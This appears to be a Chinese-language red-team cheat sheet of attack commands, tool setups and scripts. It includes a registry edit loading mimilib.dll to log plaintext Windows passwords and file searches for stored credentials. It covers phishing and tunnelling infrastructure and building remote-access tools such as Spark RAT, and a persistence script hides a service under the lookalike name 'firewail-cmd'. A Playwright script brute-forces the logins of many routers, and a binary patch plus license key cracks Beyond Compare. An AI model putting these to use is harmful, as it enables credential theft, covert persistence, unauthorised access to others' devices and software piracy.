rd /q/s c:\windows\temp\test         删除文件夹

dir /b/s config.*	//查看所在目录所有config.为前缀的文件
findstr /si password *.xml *.ini *.txt	//查看后缀名文件中含有password关键字的文件
findstr /si login *.xml *.ini *.txt	//查看后缀名文件中含有login关键字的文件
copy con 创建命令：	
copy con  ftp.bat	//创建ftp.bat批处理，然后输入ifconfig等命令，按ctr+z退出，并创建成功
copy con  test.vbs	//创建test.vbs脚本，输入脚本后，按ctr+z退出，并创建成功
 
 
5.dsquery的AD查询工具：
dsquery user domainroot -limit 65535 && net user /domain	//列出该域内所有用户名
dsquery server -domain super.com | dsget server -dnsname -site	//搜索域内所有域控制器并显示他们的DNS主机名和站点名称
dsquery contact	//寻找目录中的联系人
dsquery subnet	//列出该域内网段划分
query user	//查询那些用户在线
dsquery group && net group /domain	//列出该域内分组
dsquery ou	//列出该域内组织单位
dsquery server && net time /domain	//列出该域内域控制器
dsquery site -o rdn	//搜索域中所有站点的名称
dsquery group dc=super,dc=com |more	//搜索在DC=SUPER,DC=COM 域中的所有组
psloggedon.exe	//查询那台主机和用户登录到该主机上
netsess.exe   //192.168.1.115	//远程主机上无需管理员权限,查询到主机名和用户
reg query "HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVERCLIENT\DEFAULT"	//获取最近mstsc登录的记录
 
 
6.DOS常用快捷命令
mspaint	画图工具
calc	计算器
notepad	记事本
taskmgr	任务管理器
osk	打开屏幕键盘
gpedit.msc	组策略
services.msc	本地服务
compmgmt.msc	计算机管理
devmgmt.msc	设备管理器
winver	查看系统版本
magnify	放大镜实用程序
eventvwr	事件查看器
Regedit	打开注册表
resmon	资源监视器
WMIC BIOS get releasedate	查看电脑生产日期
mstsc -f	远程连接（可以全屏）


==============

find / -type f -perm a=rwx -exec ls -l {} \;

reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v "Security Packages" /t REG_MULTI_SZ /d mimilib.dll /f
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /s

 等待系统重启后，在c:\windows\system32生成文件kiwissp.log，记录当前用户的明文口令




```
# 一键安装yum、sz、rz、vim、screen、git、nmap、masscan、unzip、nps、docker环境、docker-compose、frp、钓鱼平台gophish x86_64、Allin_go、java环境、Ehole v3.0、dnsx、subfinder、Allin、Onefora
```
yum update -y #更新yum
yum install  lrzsz -y #安装sz、rz
yum install vim -y #安装vim
yum install screen -y #安装screen
yum install git -y # 安装git
yum install nmap -y #安装nmp
yum install masscan -y #安装masscan
yum install unzip -y #安装unzip


#安装nps
cd /usl/local/
mkdir nps-server
cd nps-server
wget https://github.com/ehang-io/nps/releases/download/v0.26.10/linux_amd64_server.tar.gz
tar -zxvf linux_amd64_server.tar.gz
rm -rf linux_amd64_server.tar.gz
chmod +x ./nps
#**注意** 需要修改端口就在nps.conf处修改，我使用180、1443、8081
./nps install #默认8080 80 443 端口
cd /usl/local/
rm -rf /usl/local/nps-server
nps start

#安装docker环境

ubuntu 安装docker
curl -fsSL https://get.docker.com -o get-docker.sh
sudo sh get-docker.sh

#centos 安装docker
yum install -y yum-utils
yum-config-manager \
    --add-repo \
    https://download.docker.com/linux/centos/docker-ce.repo

yum install docker-ce docker-ce-cli containerd.io -y
mkdir -p /etc/docker #创建目录
#配置镜像加速器地址
sudo tee /etc/docker/daemon.json <<-'EOF'
{
  "registry-mirrors": ["https://rrnv06ig.mirror.aliyuncs.com"]
}
EOF

systemctl start docker
systemctl enable docker

#安装docker-compose
curl -L "https://github.com/docker/compose/releases/download/v2.10.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
chmod +x /usr/local/bin/docker-compose
docker-compose --version

#强制安装特定版本docker-compose
# github: https://github.com/docker/compose/releases/tag/v2.20.2 
# 国内下载地址：https://gitee.com/smilezgy/compose/releases/tag/v2.20.2
curl -SL https://github.com/docker/compose/releases/download/v2.20.2/docker-compose-linux-x86_64 -o /usr/local/bin/docker-compose
cp docker-compose-linux-x86_64 /usr/local/bin/docker-compose
chmod +x /usr/local/bin/docker-compose
docker-compose --version

 

docker search kali
docker pull kalilinux/kali-rolling
docker run --name kali -t -i kalilinux/kali-rolling /bin/bash

#上面是搭建，下面命令需要进入到docker系统后才能使用
mv /etc/apt/sources.list /etc/apt/sources.list.bak
echo  "deb http://mirrors.tuna.tsinghua.edu.cn/debian/ buster main contrib non-free" >>/etc/apt/sources.list
echo  "deb http://mirrors.tuna.tsinghua.edu.cn/debian/ buster-updates main contrib non-free" >>/etc/apt/sources.list
echo  "deb http://mirrors.tuna.tsinghua.edu.cn/debian/ buster-backports main contrib non-free" >>/etc/apt/sources.list
echo  "deb http://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates main contrib non-free" >>/etc/apt/sources.list
apt-get update
apt-get install wget -y

wget archive.kali.org/archive-key.asc
apt-key add archive-key.asc 
apt-get install gnupg1
apt-key add archive-key.asc 

echo  > /etc/apt/sources.list
echo "deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib" >>/etc/apt/sources.list
echo "deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib" >>/etc/apt/sources.list
apt-get update
apt search kali-linux
apt install kali-linux-default -y


#使用docker
docker ps -a
#30bf74de4523替换成docker ps -a看到的id
docker start 30bf74de4523
docker exec -it 30bf74de4523 bash
#暂停删除
docker stop 30bf74de4523
docker rm -f 30bf74de4523


#docker 安装winxp,win7,vista,2012,2016,2019,win10,win11
git clone https://github.com/dockur/windows.git
cd windows
docker run -it --rm --name windows -p 8006:8006 --device=/dev/kvm --cap-add NET_ADMIN --stop-timeout 120 dockurr/windows


#安装frp
cd /usr/local
wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz
tar -zxvf frp_0.44.0_linux_amd64.tar.gz
cd frp_0.44.0_linux_amd64
chmod +x ./frps
sudo tee /usr/local/frp_0.44.0_linux_amd64/frps.ini <<-'EOF'
[common]
bind_port = 7000  #与客户端绑定的进行通信的端口

dashboard_port = 8090 #开启服务器WEB面板
dashboard_user = admin
dashboard_pwd = admin
EOF
#运行此程序即可开启 ./frps -c ./frps.ini 访问https://VPS-IP:8090

#安装钓鱼平台gophish x86_64
cd /usr/local
wget https://github.com/gophish/gophish/releases/download/v0.12.0/gophish-v0.12.0-linux-64bit.zip
mkdir gophish
unzip gophish-v0.12.0-linux-64bit.zip -d ./gophish
rm -rf gophish-v0.12.0-linux-64bit.zip
cd /usr/local/gophish
#**注意**，若需要修改端口就在config.json处修改。默认3333和80，我是8091和80
chmod +x ./gophish
#若出现"remote error: tls: unknown certificate"，则可能是防火墙或者iptables拦截(我自己是防火墙)，systemctl stop firewalld（我是开了又关，才成功）
systemctl start firewalld
systemctl stop firewalld

#安装Allin_go
git clone https://github.com/P1-Team/AlliN.git

#安装java环境
wget https://repo.huaweicloud.com/java/jdk/8u201-b09/jdk-8u201-linux-x64.tar.gz
tar -zxvf jdk-8u201-linux-x64.tar.gz
mkdir /usr/local/jdk1.8
mv jdk1.8.0_201 /usr/local/jdk1.8/jdk1.8.0_201
#配置java的环境变量
cat>>/etc/profile<<EOF
export JAVA_HOME=/usr/local/jdk1.8/jdk1.8.0_201
export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar
export PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin
export JER_HOME=$JAVA_HOME/jre
EOF
#更新配置
source /etc/profile
java -version

#windows jdk1.6,jdk1.7,jdk1.8
1.6
https://repo.huaweicloud.com/java/jdk/6u45-b06/jdk-6u45-windows-x64.exe  
1.7
https://repo.huaweicloud.com/java/jdk/7u80-b15/jdk-7u80-windows-x64.exe  
1.8
https://repo.huaweicloud.com/artifactory/java-local/jdk/8u202-b08/jdk-8u202-windows-x64.exe  
jdk10
https://repo.huaweicloud.com/java/jdk/10.0.2+13/jdk-10.0.2_windows-x64_bin.exe  

#安装Ehole v3.0
cd /usr/local/
wget https://github.com/EdgeSecurityTeam/EHole/releases/download/3.0/Ehole3.0-linux.zip
mkdir Ehole3.0
unzip Ehole3.0-linux.zip -d ./Ehole3.0
cd Ehole3.0
chmod +x Ehole3.0-linux
./Ehole3.0-linux

#安装dnsx
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
cp /root/go/bin/dnsx /usr/local/bin
dnsx -h

#安装subfinder
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
cp /root/go/bin/subfinder /usr/local/bin
subfinder -h

#安装Allin
cd /usr/local/
mkdir Py-script
cd Py-script
mkdir py3
cd py3
git clone https://github.com/P1-Team/AlliN.git
mv AlliN/AlliN.py cd /usr/local/Py-script/py3
python3 Py-script

#安装Oneforall
cd /usr/local/
git clone https://github.com/shmilylty/OneForAll.git
cd OneForALL
python3 -m pip install -U pip setuptools wheel -i https://mirrors.aliyun.com/pypi/simple/
pip3 install -r requirements.txt -i https://mirrors.aliyun.com/pypi/simple/
python3 oneforall.py --help

#安裝Masscan-to-CSV
cd /usr/local/Py-script/py3
git clone https://github.com/laconicwolf/Masscan-to-CSV.git
mv Masscan-to-CSV/masscan_xml_parser.py  /usr/local/Py-script/py3
rm -rf Masscan-to-CSV

#安裝
cd /usr/local/Py-script/py3
git clone https://github.com/laconicwolf/Nmap-Scan-to-CSV.git
rm -rf Nmap-Scan-to-CSV
mv Nmap-Scan-to-CSV/nmap_xml_parser.py  /usr/local/Py-script/py3
```
#安装灯塔
```
systemctl start docker.service

docker pull tophant/arl
git clone https://github.com/TophantTechnology/ARL
cd ARL/docker/

docker-compose up -d  
docker volume create --name=arl_db
```
# spark rat
```
# Clone该项目。
git clone https://github.com/XZB-1248/Spark
cd ./Spark


# 开始编译前端页面。
yum install npm
cd ./web
# 安装所有的依赖，然后编译。
npm install
npm run build-prod


# 通过statik，将前端文件嵌入到服务端里。
cd ..
go install github.com/rakyll/statik
statik -m -src="./web/dist" -f -dest="./server/embed" -p web -ns web


# 开始编译客户端。
# 在使用类Unix系统时，运行以下命令。
#需要安装go编译环境
mkdir ./built
go mod tidy
go mod download
./scripts/build.client.sh


# 最终开始编译服务端。
mkdir ./releases
./scripts/build.server.sh

cp -r ./built ./releases
cd ./releases/

# 写一个config.json配置文件
cat << EOF > config.json
{
    "listen": ":80",
    "salt": "12bcdef",
    "auth": {
        "useradmin": "pasord120"
    },
    "log": {
        "level": "info",
        "path": "./logs",
        "days": 7
    }
}
EOF


```
## 另一个远程控制和上面的spark rat类似
```
git clone https://github.com/WangYihang/Platypus
cd Platypus
sudo apt install -y make curl
make install_dependency
make release


```


# 开机启动
```
#!/bin/bash

# Check if systemctl command exists
if command -v systemctl &> /dev/null; then
    # System is using systemctl
    echo "System is using systemctl"
    echo "Creating systemctl service script..."

    # Write the systemd service script
    cat << EOF > /etc/systemd/system/firewail-cmd.service
[Unit]
Description=Firewail Command Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/firewail-cmd
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

    # Enable and start the service
    systemctl enable firewail-cmd.service
    systemctl start firewail-cmd.service

    echo "firewail-cmd.service created and enabled."

# Check if chkconfig command exists
elif command -v chkconfig &> /dev/null; then
    # System is using chkconfig
    echo "System is using chkconfig"
    echo "Creating chkconfig service script..."

    # Write the chkconfig service script
    cat << EOF > /etc/init.d/firewail-cmd
#!/bin/bash
# chkconfig: 2345 20 80
# description: Firewail Command Service

case "\$1" in
  start)
    /usr/bin/firewail-cmd &
    ;;
  stop)
    killall firewail-cmd
    ;;
  restart)
    \$0 stop
    \$0 start
    ;;
  *)
    echo "Usage: \$0 {start|stop|restart}"
    exit 1
    ;;
esac
exit 0
EOF

    # Set executable permissions
    chmod +x /etc/init.d/firewail-cmd

    # Add to chkconfig and start service
    chkconfig --add firewail-cmd
    chkconfig firewail-cmd on
    service firewail-cmd start

    echo "firewail-cmd script created and enabled."

# Check if update-rc.d command exists
elif command -v update-rc.d &> /dev/null; then
    # System is using update-rc.d
    echo "System is using update-rc.d"
    echo "Adding firewail-cmd service to startup..."

    # Add the service to startup
    update-rc.d firewail-cmd defaults

    # Start the service
    /usr/bin/firewail-cmd &

    echo "firewail-cmd service added to startup."

# Check if service command exists (for Ubuntu)
elif command -v service &> /dev/null; then
    # System is using service
    echo "System is using service"
    echo "Creating service script..."

    # Write the service script
    cat << EOF > /etc/init.d/firewail-cmd
#!/bin/bash
# Provides:          firewail-cmd
# Required-Start:    \$remote_fs \$syslog
# Required-Stop:     \$remote_fs \$syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Firewail Command Service
# Description:       Firewail Command Service

case "\$1" in
  start)
    /usr/bin/firewail-cmd &
    ;;
  stop)
    killall firewail-cmd
    ;;
  restart)
    \$0 stop
    \$0 start
    ;;
  *)
    echo "Usage: \$0 {start|stop|restart}"
    exit 1
    ;;
esac
exit 0
EOF

    # Set executable permissions
    chmod +x /etc/init.d/firewail-cmd

    # Add service to startup and start service
    update-rc.d firewail-cmd defaults
    service firewail-cmd start

    echo "firewail-cmd script created and enabled."

else
    echo "Error: Unable to determine the init system used by the system."
    exit 1
fi

```
## QEMU auto build install debian—ubuntu
```
#!/bin/sh

#Author:tman904 aka Tyler K Monroe
#Purpose:Downloads an OpenBSD install iso and setups qemu VM with one 8GB virtual disk ,1024Megabytes of RAM and one vNIC using tun0 on the Linux host OS
#Version:0.0.1
#Date:2/5/2024 00:13

dlfile="install$vn1$vn2.iso"
qemu_img_file="obsd.img"
osver="7.4"
arch="amd64"
#remove dot from osver variable.
vn1=`echo $osver |cut -d '.' -f1` 
vn2=`echo $osver |cut -d '.' -f2`


apt-get install qemu qemu-system qemu-user qemu-utils qemu-user-static uml-utilities bridge-utils


sudo ifconfig tun0 0.0.0.0
#tunctl是debian ubuntu下的命令如果是centos，需要yum install iproute
sudo tunctl -d tun0
sleep 2

sudo tunctl -t tun0

sudo ifconfig tun0 192.168.10.2

echo "pulling down OpenBSD $osver $arch"
wget https://cdn.openbsd.org/pub/OpenBSD/$osver/$arch/install$vn1$vn2.iso
sudo qemu-img create -f qcow2 obsd.img 8G

sudo qemu-system-x86_64 -m 1024M -cdrom ./install$vn1$vn2.iso -netdev tap,id=net0,ifname=tun0,script=no,downscript=no -device e1000,netdev=net0 obsd.img

#clean up host system

sudo ifconfig tun0 down
sudo tunctl -d tun0
#sudo rm ./$qemu_img_file
#sudo rm ./install$vn1$vn2.iso
```
## qemu centos
```
yum install iproute qemu qemu-system qemu-user qemu-utils qemu-user-static -y


#!/bin/bash
IMAGE=/home/jie/share/src/study/qemu_openwrt/source/bin/targets/armvirt/64/openwrt-armvirt-64-Image-initramfs
LAN=openwrt_tap0
# create tap interface which will be connected to OpenWrt LAN NIC
ip tuntap add mode tap $LAN
ip link set dev $LAN up
# configure interface with static ip to avoid overlapping routes
ip addr add 192.168.99.241/24 dev $LAN
qemu-system-aarch64 \
    -device virtio-net-pci,netdev=lan \
    -netdev tap,id=lan,ifname=$LAN,script=no,downscript=no \
    -device virtio-net-pci,netdev=wan \
    -netdev user,id=wan \
    -M virt -nographic -m 512 -cpu cortex-a53 -smp 4  -kernel $IMAGE
# cleanup. delete tap interface created earlier
ip addr flush dev $LAN
ip link set dev $LAN down
ip tuntap del mode tap dev $LAN


```
### 竟斗云刷openwrt
```
https://github.com/xywf221/R619AC/releases
```


## semgrep-rules 挖掘c语言漏洞
```
python3 -m pip install semgrep
semgrep --version
python3 -m pip install --upgrade semgrep

系统默认规则
semgrep --config "p/phpcs-security-audit" /mnt/share/project/ctf_archives/test/baijiacms

c语言审计规则去这里下载https://github.com/fxc233/semgrep-rules.git 
下面是使用
semgrep --config /tmp/C/ /tmp/myproject
```
## fdcalls 自动挖掘iot router漏洞
```
sudo apt-get install gcc-arm-linux-gnueabi radare2
pip3 install fdcalls
git clone https://github.com/fxc233/fdcalls
cd fdcalls
sudo python3 setup.py install
pip3 install -r requirements.txt

#使用
fdcalls -b /usr/bin/ls -d /usr/
```
## 一款红/蓝队环境自动化部署工具,支持多种场景,渗透,开发,代理环境,服务可选项等
```
touch /tmp/IS_CI
wget -O f8x https://f8x.io/ && mv --force f8x /usr/local/bin/f8x && chmod +x /usr/local/bin/f8x
f8x -k

git clone https://github.com/ffffffff0x/f8x.git
cd f8x/

-b : install Basic Environment (gcc、make、git、vim、telnet、jq、unzip and other basic tools)
-p : install Proxy Environment (Warning : Use only when needed)
-d : install Development Environment (python3、pip3、Go、Docker、Docker-Compose、SDKMAN)
-k (a/b/c/d/e): install Pentest environment (hashcat、ffuf、OneForAll、ksubdomain、impacket and other Pentest tools)
-s : install Blue Team Environment (Fail2Ban、chkrootkit、rkhunter、shellpub)
-f : install Other Tools (AdguardTeam、trash-cli、fzf)
-cloud : install Cloud Applications (Terraform、Serverless Framework、wrangler)
-all : fully automated deployment (Compatible with CentOS7/8,Debain10/9,Ubuntu20/18,Fedora33)
Development Environment

-docker : install docker
-lua : install lua
-nn : install npm & NodeJs
-go : install go
-oraclejdk(8/11): install oraclejdk
-openjdk : install openjdk
-py3(7/8/9/10) : install python3
-py2 : install python2
-pip2-f : force install pip2 (It is recommended to run with the -python2 option failing)
-perl : install perl
-ruby : install ruby
-rust : install rust
-code : install code-server
-chromium : install Chromium (Used with rad, crawlergo in the -k option)
-phantomjs : install PhantomJS
Blue Team Service

-binwalk : install binwalk
-binwalk-f : force install binwalk (It is recommended to run if the -binwalk option fails)
-clamav : install ClamAV
-lt : install LogonTracer (High hardware configuration requirements)
-suricata : install Suricata
-vol : install volatility
-vol3 : install volatility3
Red Team Service

-aircrack : install aircrack-ng
-bypass : install Bypass
-goby : install Goby (The client side requires a graphical environment, the server side does not.)
-wpscan : install wpscan
-yakit : install yakit
Red Team Infrastructure

-awvs14 : install AWVS14 (~1.04 GB)
-cs : install CobaltStrike 4.3
-cs45 : install CobaltStrike 4.5
-frp : install frp
-interactsh : install interactsh (https://github.com/projectdiscovery/interactsh)
-merlin : install merlin (https://github.com/Ne0nd0g/merlin)
-msf : install Metasploit
-nps : install nps
-pupy : install pupy (https://github.com/n1nj4sec/pupy)
-rg : install RedGuard (https://github.com/wikiZ/RedGuard)
-sliver : install sliver-server && client (https://github.com/BishopFox/sliver)
-sliver-client : install sliver-client
-sps : install SharPyShell (https://github.com/antonioCoco/SharPyShell)
-viper : install Viper (~2.1 GB)
Docker-based environment deployment

-arl : install ARL (~872 MB)
-mobsf : install MobSF (~1.54 GB)
-nodejsscan : install nodejsscan (~873 MB)
-vulhub : install vulhub (~210 MB)
-vulfocus : install vulfocus (~1.04 GB)
-TerraformGoat: install TerraformGoat
Miscellaneous Services

-asciinema : install asciinema
-bt : install 宝塔服务
-clash : install clash (https://github.com/juewuy/ShellClash)
-nginx : install nginx
-ssh : install ssh (RedHat is available by default, no need to reinstall)
-ssr : install ssr
-zsh : install zsh
Other

-clear : Clean up system usage traces
-info : View system information
-optimize : Improve device options and optimize performance
-remove : Uninstall some vps cloud monitoring
-rmlock : Run the Unlock module
-swap : Configuring swap partitions
-update : Update f8x
-upgrade : Upgrade Pentest tools

```
### 多级代理，多层代理

```
git clone https://github.com/Dliv3/Venom
cd Venom
bash build.sh

admin监听端口，agent发起连接:

./admin_macos_x64 -lport 9999 -passwd abc123
./agent_linux_x64 -rhost 192.168.0.103 -rport 9999 -passwd abc123
agent监听端口，admin发起连接:

./agent_linux_x64 -lport 8888 -passwd abc123
./admin_macos_x64 -rhost 192.168.204.139 -rport 8888 -passwd abc123

第一种端口复用方法

# 以windows下apache为例
# 复用apache 80端口，不影响apache提供正常的http服务
# -lhost 的值为本机ip，不能写0.0.0.0，否则无法进行端口复用
./agent.exe -lhost 192.168.204.139 -reuse-port 80
./admin_macos_x64 -rhost 192.168.204.139 -rport 80

Stowaway:
git clone https://github.com/ph4ntonn/Stowaway.git

rakshasa:
git clone https://github.com/Mob2003/rakshasa.git

```
### diff xxd dhex diffcmp对比二个程序hex十六进制
```
apt-get install dhex hexdiff vimdiff xxd diff hexdump -y

diff <(xxd xray_crack.exe) <(xxd xray_windows_amd64.exe)
diff <(hexdump xray_crack.exe) <(hexdump xray_windows_amd64.exe)

dhex xray_crack.exe xray_windows_amd64.exe
```

### linux hex diff gui界面比命令行好用


```
wget https://www.scootersoftware.com/files/bcompare-4.4.7.28397_amd64.deb  
dpkg -i bcompare-4.4.7.28397_amd64.deb  

sudo rm -rf ~/.config/bcompare #thinks bensonkb
sudo sed -i "s/keexjEP3t4Mue23hrnuPtY4TdcsqNiJL-5174TsUdLmJSIXKfG2NGPwBL6vnRPddT7tH29qpkneX63DO9ECSPE9rzY1zhThHERg8lHM9IBFT+rVuiY823aQJuqzxCKIE1bcDqM4wgW01FH6oCBP1G4ub01xmb4BGSUG6ZrjxWHJyNLyIlGvOhoY2HAYzEtzYGwxFZn2JZ66o4RONkXjX0DF9EzsdUef3UAS+JQ+fCYReLawdjEe6tXCv88GKaaPKWxCeaUL9PejICQgRQOLGOZtZQkLgAelrOtehxz5ANOOqCaJgy2mJLQVLM5SJ9Dli909c5ybvEhVmIC0dc9dWH+/N9KmiLVlKMU7RJqnE+WXEEPI1SgglmfmLc1yVH7dqBb9ehOoKG9UE+HAE1YvH1XX2XVGeEqYUY-Tsk7YBTz0WpSpoYyPgx6Iki5KLtQ5G-aKP9eysnkuOAkrvHU8bLbGtZteGwJarev03PhfCioJL4OSqsmQGEvDbHFEbNl1qJtdwEriR+VNZts9vNNLk7UGfeNwIiqpxjk4Mn09nmSd8FhM4ifvcaIbNCRoMPGl6KU12iseSe+w+1kFsLhX+OhQM8WXcWV10cGqBzQE9OqOLUcg9n0krrR3KrohstS9smTwEx9olyLYppvC0p5i7dAx2deWvM1ZxKNs0BvcXGukR+/g" /usr/lib/beyondcompare/BCompare
bcompare

```

Then restart BC, click "Enter License":
```
--- BEGIN LICENSE KEY ---
GXN1eh9FbDiX1ACdd7XKMV7hL7x0ClBJLUJ-zFfKofjaj2yxE53xauIfkqZ8FoLpcZ0Ux6McTyNmODDSvSIHLYhg1QkTxjCeSCk6ARz0ABJcnUmd3dZYJNWFyJun14rmGByRnVPL49QH+Rs0kjRGKCB-cb8IT4Gf0Ue9WMQ1A6t31MO9jmjoYUeoUmbeAQSofvuK8GN1rLRv7WXfUJ0uyvYlGLqzq1ZoJAJDyo0Kdr4ThF-IXcv2cxVyWVW1SaMq8GFosDEGThnY7C-SgNXW30jqAOgiRjKKRX9RuNeDMFqgP2cuf0NMvyMrMScnM1ZyiAaJJtzbxqN5hZOMClUTE+++
--- END LICENSE KEY -----
```
如果想要反汇编成hex或者asm，如下命令
把909090替换成自己的hex
```
echo -n -e "$(echo '90909090' | sed -r 's/(..)/\\x\1/g')" | ndisasm -b32 -
ndisasm -b32 example.bin
ndisasm -b32 -M intel example.bin

```
### 截图
```
apt-get install flameshot

xfce4-keyboard-settings
然后直接添加flameshot gui,之后设置ctrl + alt + a

```
### 离线ip查询，nali
```
git clone https://github.com/zu1k/nali.git
go build
nali update
```
### windows rootkit
```
windows rootkit收集
https://artemonsecurity.com/windows_rootkits.pdf
https://github.com/cn6u9/cn6u9.github.io/blob/main/tools/windows_rootkits.pdf

```

### 编译jar 环境最好用jdk1.8
```
git clone https://github.com/kkbo8005/dicttools.git
cd dicttools

apt update
apt install maven
mvn -N io.takari:maven:wrapper
./mvnw clean install

```
### windows 通过元素暴力破解winbox airos routeos路由帐号密码，本地创建pwd.txt是密码，airos_url.txt是批量url，可以使用http,socks4,5代理
```
from playwright.sync_api import Playwright, sync_playwright, expect
import time
import re
import json
import math
from lxml import etree
import requests
import ssl

ssl._create_default_https_context = ssl._create_unverified_context
requests.packages.urllib3.disable_warnings()

suc = []
urls_list = set()
google_keywords_list = set()
urls_fail = set()
with open("pwd.txt", 'r', encoding='utf-8') as google_keyword_handle:
    for i in google_keyword_handle:
        google_keywords_list.add(i.strip())

with open("airos_url.txt", 'r') as google_url_handle:
    for i in google_url_handle:
        urls_list.add(i.strip())

def Start_check(page):
    for url in urls_list:
        url = url.strip()
        try:
            # proxies = {
            #     "http": "socks4://1.1.1.1:11665",
            #     "https": "socks4://1.1.1.1:11665"
            # }
            # rep = requests.get(url,verify=False,timeout=(10,10),proxies=proxies)
            rep = requests.get(url, verify=False, timeout=(10, 10))
        except:
            print(f"{url} access failed ----------------------------S-------------")
            urls_fail.add(f"{url}\n")
            continue
        print(f"{url} testing..............")
        for keyword in google_keywords_list:
            keyword = keyword.strip()
            # print(f"{keyword} testing.....")
            try:
                page.goto(url)
                # page.goto("https://www.google.com/sorry/index?continue=https://www.google.com/search?q=dirsearch+添加代理&oq=dirsearch+添加代理+&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTIHCAEQABiABDIHCAIQABiABDIHCAMQABiABDIHCAQQABiABDIHCAUQABiABDIHCAYQABiABDIHCAcQABiABDIHCAgQABiABNIBCDUzMjhqMGo0qAIAsAIA&sourceid=chrome&ie=UTF-8&q=EgTAfLBGGNmzn68GIjC2mZH4cMVbxG7-c7D2-mDZjZnONqREefhH8EDrbV2GWkq9ZkBr-Detw3-ALuvyqL0yAXJaAUM")
                # 通过显示等待元素，元素不存在就报错进入 except

                try:
                    page.wait_for_selector('#username', timeout=3000)# 搜索有结果，就会有id为 result-stats 的标签出现
                    page.fill('#username','ubnt')
                    page.fill("#password",keyword)
                    # page.locator('[ondragstart="return false;"]').click()
                    page.keyboard.press("Enter")
                    try:
                        elements = page.wait_for_selector("body",timeout=10000)
                        textsss = elements.inner_text()
                        if "Invalid credential" in textsss:
                            continue
                        else:
                            print(11)
                            try:
                                elements = page.wait_for_selector("#hwinfo")
                                print(f"{url} {keyword} success ++++++++++++++++++++++++++++++++++++++++++++++++++++ ")
                                break
                            except:
                                pass

                    except Exception as e:
                        # pass
                        try:
                            elements = page.wait_for_selector("#hwinfo")
                            print(f"{url} {keyword} success ++++++++++++++++++++++++++++++++++++++++++++++++++++ ")
                            break
                        except:
                            pass

                except Exception as e:
                    print(e)
            except:
                pass


with sync_playwright() as p:
    browser = p.chromium.launch(headless=False,args=["--ignore-certificate-errors"])
    # browser = p.chromium.launch(headless=False, args=["--ignore-certificate-errors"],proxy={"server": "socks4://1.1.1.10:11665"})
    page = browser.new_page()
    Start_check(page)

with open('urls_fail.txt','w',encoding='utf-8') as urls_fail_handle:
    urls_fail_handle.writelines(urls_fail)
```
### 端口复用,port reuse
```
如果一个go文件下面没有go.sum,go.mod使用下面命令就可以自动创建
go mod init port_forwarder
go get golang.org/x/sys/windows
go get golang.org/x/net/proxy


```
### fofa api
```
git clone https://github.com/ffffffff0x/ones.git
cd ones
go build

tee ones-config.json <<-'EOF'
{
  "fofa_key": [
    "changme@163.com:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
  ],
  "zoom_key": [
    "xxxxxxxx-xxxx-xxxxx-xxxx-xxxxxxxxxx"
  ],
  "shodan_key": [
    "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
  ],
  "quake_key": [
    "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxx"
  ],
  "hunter_key": [
    "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
  ],
  "chaos_key": [
    "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
  ]
}
EOF

./ones -fofa 'app="APACHE-Tomcat"' -num 2000


```
### linux 安全应急检查
```
git clone https://github.com/Ashro-one/Ashro_linux.git
bash Ashro_linux.sh

git clone https://github.com/al0ne/LinuxCheck.git
上面这个linux check不好用

```
### strace 在linux hook编程中的应用和常用设置
```
linux hook中查看一个进程accept这个函数是否与外界交互
strace -p 12345 -e trace=accept

strace -o whoami-strace.txt whoami

```
### 免费申请证书，一键申请证书
```
#!/bin/bash

# 确保脚本以 root 身份运行
if [ "$EUID" -ne 0 ]; then
    echo "请以 root 身份运行此脚本。"
    exit 1
fi

# 检查系统类型
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$ID
else
    echo "无法确定操作系统类型，请手动检查。"
    exit 1
fi

# 检查并安装 socat
if ! command -v socat &> /dev/null; then
    echo "socat 未安装，正在安装 socat..."
    if [ "$OS" == "debian" ] || [ "$OS" == "ubuntu" ]; then
        apt update
        apt install -y socat
    elif [ "$OS" == "centos" ]; then
        yum install -y socat
    else
        echo "不支持的操作系统。"
        exit 1
    fi
    if [ $? -ne 0 ]; then
        echo "socat 安装失败，请检查错误信息。"
        exit 1
    fi
else
    echo "socat 已安装。"
fi

# 检查 nginx 服务状态
nginx_status=$(systemctl is-active nginx)
if [ "$nginx_status" == "active" ]; then
    echo "nginx 服务正在运行，准备停止..."
    systemctl stop nginx
    if [ $? -ne 0 ]; then
        echo "停止 nginx 失败，请检查错误信息。"
        exit 1
    fi
else
    echo "nginx 服务未运行，无需停止。"
fi

# 检查端口 80 是否被占用
if lsof -i:80 &> /dev/null; then
    echo "端口 80 被占用，无法继续。"
    exit 1
fi

# 安装 acme.sh
if [ ! -d "$HOME/.acme.sh" ]; then
    echo "正在安装 acme.sh..."
    curl https://get.acme.sh | sh
    if [ $? -ne 0 ]; then
        echo "acme.sh 安装失败，请检查错误信息。"
        exit 1
    fi
else
    echo "acme.sh 已安装。"
fi

# 设置默认 CA 为 Let’s Encrypt
echo "设置默认 CA 为 Let’s Encrypt..."
~/.acme.sh/acme.sh --set-default-ca --server letsencrypt

# 获取用户输入的域名
read -p "请输入主域名: " main_domain
domains=($main_domain)
while true; do
    read -p "请输入附加域名（或按 Enter 键结束输入）: " additional_domain
    if [ -z "$additional_domain" ]; then
        break
    fi
    domains+=("$additional_domain")
done

